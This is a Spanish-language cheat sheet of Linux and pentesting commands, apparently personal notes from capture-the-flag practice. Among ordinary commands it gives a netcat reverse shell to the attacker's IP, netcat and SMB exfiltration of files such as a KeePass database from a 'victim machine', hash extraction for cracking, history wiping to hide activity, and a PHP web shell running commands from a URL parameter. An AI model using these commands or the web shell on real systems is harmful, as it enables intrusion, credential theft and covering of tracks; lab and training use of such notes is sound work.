# Comandos Linux


- Comando -> **watch -n 1 ls -l /bin/bash** Monitoreamos el comando /bin/bash y miramos con ls -l (l=ele)
- Comando -> **!$** Referencias el ultimo argumento que hayamos puesto en la consola 
- Comando -> **echo ‘’ > ~/.zsh_history** Para borrar el historial en la zshrc
- Comando -> **ps -faux** Listas los procesos que corren en la maquina Linux

- Comando -> **7z l file.zip** (l=ele) Podemos ver el contenido interno del archivo zip, gz, bzip2, etc...
- Comando -> **7z x file.gz** (l=ele) Podemos extraer el contenido interno del archivo zip, gz, bzip2, etc...


- Comando -> **find / -name < WORD> 2>/dev/null** Para encontrar el directorio y los permisos denegados no nos los muestre

- Comando -> **ls bin/** Para ver que comandos podemos ejecutar 

- Server Comando -> **nc.exe -e cmd < NUESTRA IP> < PUERTO>** Para ejecutar el netcat y nos haga una ReverShell a nuestra IP y puerto especifico

- Comando -> **nc < Nuestra IP> 443 < secret.zip** Nos ponemos en escucha por el puerto 443, maquinas Linux, para mandar un archivo por netcat a nuestra direccion IP, esto desde la maquina victima
- Comando -> **nc -nlvp 443 > secret.zip** Nos ponemos en escucha por el puerto 443, maquinas Linux esto en la maquina de atacante para recibir el archivo y colocarlo con la misma extencion y el mismo nombre.

- Comando -> **smbserver.py < FOLDERNAME> $(pwd)** Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
- Comando -> **impacket-server < FOLDERNAME> $(pwd) -smb2support** Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
	- **\\\\10.10.14.17\\smbFolder\\nc.exe -e cmd 10.10.14.17 443** Vamos a crear un recurso compartido smb con nuestra maquina para compartir el nc.exe y despues hacer que cuando lo ejecute nos regrese una consola interactiva por el puerto 443 (Se coloca en la maquina victima)
	- **copy CEH.kdbx \\\\10.10.14.17\\smbFolder\\CEH.kdbx** Copiamos un archivo de la maquina victima a nuestra maquina de atacante
		- CEH.kdbx -> Nombre dek archivo que nos queremos copiar de la maquina victima
		- 10.10.14.17 -> Nuestra direccion IP
		- smbFolder -> Nombre de la carpeta del recurso compartido 

- Encontrar un archivo con extencion **.kdbx** 
	Son archivos de datos creados por KeePass 'Password Safe', se refieren a la passwd de base de datos KeePass
	- **keepassxc FILE.kdbx** Nos permite abrir un archivo keepass con passwd, de lo contrario hacemos lo siguiente
	- **keepass2john FILE.kdbx > hash** Si no sabemos la passwd, esto no sayuda a extraer un hash para poder hacer fuerza bruta, guardandolo en un archivo llamado hash 

- Comando -> **cewl -w < FileName.txt> <http://URL/>** Creas un diccionario mas 'personalizado' con las palabras de una webpage y te regresa un archivo de texto

- Comando -> **find / -name < NAME> 2>/dev/null** Para encontrar el directorio y los permiso denegados no nos los muestre


----
Codigo PHP para que en la url nosotros podamos ejecutar diferentes comandos **/image.php?cmd=whoami**
Despues del primer ? va php esto en los tres de abajo
<?
	system($_REQUEST['cmd']);
?>
